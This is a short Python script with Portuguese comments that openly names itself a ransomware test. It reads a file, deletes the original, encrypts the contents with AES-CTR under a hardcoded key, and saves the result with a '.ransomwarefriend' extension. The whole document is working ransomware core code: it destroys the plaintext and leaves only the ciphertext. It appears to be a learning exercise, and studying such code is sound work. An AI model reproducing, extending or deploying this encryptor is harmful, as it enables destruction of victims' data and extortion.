import os
import pyaes

# arquivo a ser criptografado
file_name = "hello.txt"
file = open(file_name, "rb")
file_data = file.read()
file.close()

# remover o arquivo original
os.remove(file_name)

# definir chave de encriptação
key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)

#criptografar o arquivo
crypto_data = aes.encrypt(file_data)

#salvar o arquivo 
new_file = file_name + '.ransomwarefriend'
new_file = open(f'{new_file}', 'wb')
new_file.write(crypto_data)
new_file.close()